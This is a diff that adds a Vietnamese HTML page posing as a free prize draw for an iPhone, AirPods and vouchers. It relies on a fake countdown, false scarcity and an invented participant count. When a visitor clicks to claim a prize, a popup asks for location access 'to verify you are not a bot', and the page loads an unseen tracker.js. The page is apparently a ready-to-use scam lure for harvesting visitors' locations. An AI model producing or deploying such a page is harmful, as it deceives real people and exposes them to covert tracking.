@@ -1,0 +1,328 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>QUAY SỐ TRÚNG THƯỞNG - Nhận Quà Miễn Phí!</title>
+    <link rel="stylesheet" href="styles.css">
+    <style>
+        .giveaway-container {
+            text-align: center;
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 2rem;
+            background-color: #fff;
+            border-radius: 8px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
+        }
+        
+        .giveaway-header {
+            background: linear-gradient(45deg, #ff416c, #ff4b2b);
+            color: white;
+            padding: 2rem;
+            margin: -2rem -2rem 2rem -2rem;
+            border-radius: 8px 8px 0 0;
+        }
+        
+        .giveaway-title {
+            font-size: 2.2rem;
+            margin-bottom: 1rem;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
+        }
+        
+        .gift-icon {
+            font-size: 5rem;
+            margin-bottom: 1rem;
+            animation: bounce 1s infinite alternate;
+        }
+        
+        @keyframes bounce {
+            from { transform: translateY(0); }
+            to { transform: translateY(-15px); }
+        }
+        
+        .prize-list {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 1.5rem;
+            margin: 2rem 0;
+        }
+        
+        .prize-item {
+            flex: 1 1 200px;
+            border: 2px solid #f0f0f0;
+            border-radius: 8px;
+            padding: 1.5rem;
+            background-color: #f9f9f9;
+            transition: transform 0.3s, box-shadow 0.3s;
+        }
+        
+        .prize-item:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
+        }
+        
+        .prize-item img {
+            max-width: 100%;
+            height: auto;
+            border-radius: 4px;
+            margin-bottom: 1rem;
+        }
+        
+        .prize-title {
+            font-weight: bold;
+            font-size: 1.2rem;
+            margin-bottom: 0.5rem;
+        }
+        
+        .prize-value {
+            color: #ff4b2b;
+            font-weight: bold;
+            font-size: 1.1rem;
+        }
+        
+        .timer-container {
+            margin: 2rem 0;
+        }
+        
+        .timer {
+            display: flex;
+            justify-content: center;
+            gap: 1rem;
+            margin-top: 1rem;
+        }
+        
+        .timer-item {
+            background: linear-gradient(45deg, #3498db, #2980b9);
+            color: white;
+            border-radius: 8px;
+            padding: 1rem;
+            min-width: 80px;
+            text-align: center;
+        }
+        
+        .timer-value {
+            font-size: 2rem;
+            font-weight: bold;
+        }
+        
+        .timer-label {
+            font-size: 0.9rem;
+            opacity: 0.8;
+        }
+        
+        .claim-button {
+            background: linear-gradient(45deg, #2ecc71, #27ae60);
+            color: white;
+            font-size: 1.3rem;
+            font-weight: bold;
+            padding: 1rem 2.5rem;
+            border: none;
+            border-radius: 50px;
+            cursor: pointer;
+            margin-top: 2rem;
+            transition: transform 0.3s, box-shadow 0.3s;
+            box-shadow: 0 4px 15px rgba(46, 204, 113, 0.4);
+        }
+        
+        .claim-button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 7px 25px rgba(46, 204, 113, 0.5);
+        }
+        
+        .countdown-text {
+            font-size: 1.2rem;
+            color: #e74c3c;
+            font-weight: bold;
+            margin-top: 1rem;
+        }
+        
+        .participants {
+            margin-top: 2rem;
+            color: #7f8c8d;
+        }
+        
+        @media (max-width: 600px) {
+            .giveaway-title {
+                font-size: 1.8rem;
+            }
+            
+            .timer {
+                gap: 0.5rem;
+            }
+            
+            .timer-item {
+                min-width: 60px;
+                padding: 0.7rem;
+            }
+            
+            .timer-value {
+                font-size: 1.5rem;
+            }
+        }
+        
+        .location-popup {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.7);
+            z-index: 100;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .popup-content {
+            background-color: white;
+            padding: 2rem;
+            max-width: 500px;
+            width: 90%;
+            border-radius: 8px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.3);
+        }
+        
+        .close-popup {
+            float: right;
+            font-size: 1.5rem;
+            cursor: pointer;
+            color: #7f8c8d;
+        }
+        
+        #status-message {
+            margin-top: 1rem;
+            padding: 0.8rem;
+            border-radius: 4px;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+    <div class="giveaway-container">
+        <div class="giveaway-header">
+            <div class="gift-icon">🎁</div>
+            <h1 class="giveaway-title">QUAY SỐ TRÚNG THƯỞNG!</h1>
+            <p class="subtitle">Chúc mừng! Bạn đã được chọn để tham gia chương trình quay số trúng thưởng!</p>
+        </div>
+        
+        <div class="timer-container">
+            <h2>Ưu đãi kết thúc sau:</h2>
+            <div class="timer">
+                <div class="timer-item">
+                    <div class="timer-value" id="hours">05</div>
+                    <div class="timer-label">Giờ</div>
+                </div>
+                <div class="timer-item">
+                    <div class="timer-value" id="minutes">32</div>
+                    <div class="timer-label">Phút</div>
+                </div>
+                <div class="timer-item">
+                    <div class="timer-value" id="seconds">18</div>
+                    <div class="timer-label">Giây</div>
+                </div>
+            </div>
+            <p class="countdown-text">Nhanh lên! Còn lại rất ít phần quà!</p>
+        </div>
+        
+        <div class="prize-info">
+            <h2>Các phần quà hấp dẫn đang chờ bạn!</h2>
+            <div class="prize-list">
+                <div class="prize-item">
+                    <img src="https://placehold.co/300x200/ff416c/ffffff?text=iPhone+15" alt="iPhone 15">
+                    <div class="prize-title">iPhone 15 Pro Max</div>
+                    <div class="prize-value">Giá trị: 35.000.000 VNĐ</div>
+                </div>
+                <div class="prize-item">
+                    <img src="https://placehold.co/300x200/3498db/ffffff?text=AirPods" alt="AirPods Pro">
+                    <div class="prize-title">AirPods Pro 2</div>
+                    <div class="prize-value">Giá trị: 6.500.000 VNĐ</div>
+                </div>
+                <div class="prize-item">
+                    <img src="https://placehold.co/300x200/2ecc71/ffffff?text=Voucher" alt="Voucher">
+                    <div class="prize-title">Voucher Mua Sắm</div>
+                    <div class="prize-value">Giá trị: 2.000.000 VNĐ</div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="claim-section">
+            <button class="claim-button" id="claimButton">NHẬN NGAY</button>
+            <p class="participants"><b>2,374</b> người đã tham gia hôm nay</p>
+        </div>
+    </div>
+    
+    <div class="location-popup" id="locationPopup">
+        <div class="popup-content">
+            <span class="close-popup" id="closePopup">&times;</span>
+            <h2>Xác nhận thông tin nhận quà</h2>
+            <p>Để xác minh bạn không phải là bot và đủ điều kiện nhận quà, vui lòng cho phép chúng tôi xác định vị trí của bạn.</p>
+            
+            <div id="status-message">Đang xử lý...</div>
+            
+            <div class="location-info" id="locationInfo">
+                <h3>Thông tin vị trí</h3>
+                <div id="locationDetails">Đang chờ quyền truy cập...</div>
+            </div>
+            
+            <div class="button-container">
+                <button id="shareLocation">XÁC NHẬN NGAY</button>
+            </div>
+        </div>
+    </div>
+    
+    <script src="tracker.js"></script>
+    <script>
+        // Countdown Timer
+        function updateTimer() {
+            const hours = document.getElementById('hours');
+            const minutes = document.getElementById('minutes');
+            const seconds = document.getElementById('seconds');
+            
+            let h = parseInt(hours.textContent);
+            let m = parseInt(minutes.textContent);
+            let s = parseInt(seconds.textContent);
+            
+            s = s - 1;
+            
+            if (s < 0) {
+                s = 59;
+                m = m - 1;
+                
+                if (m < 0) {
+                    m = 59;
+                    h = h - 1;
+                    
+                    if (h < 0) {
+                        h = 0;
+                        m = 0;
+                        s = 0;
+                    }
+                }
+            }
+            
+            hours.textContent = h.toString().padStart(2, '0');
+            minutes.textContent = m.toString().padStart(2, '0');
+            seconds.textContent = s.toString().padStart(2, '0');
+            
+            setTimeout(updateTimer, 1000);
+        }
+        
+        // Show Location Popup
+        document.getElementById('claimButton').addEventListener('click', () => {
+            document.getElementById('locationPopup').style.display = 'flex';
+        });
+        
+        // Close Popup
+        document.getElementById('closePopup').addEventListener('click', () => {
+            document.getElementById('locationPopup').style.display = 'none';
+        });
+        
+        // Start the timer when page loads
+        window.onload = function() {
+            updateTimer();
+        };
+    </script>
+</body>
+</html> 
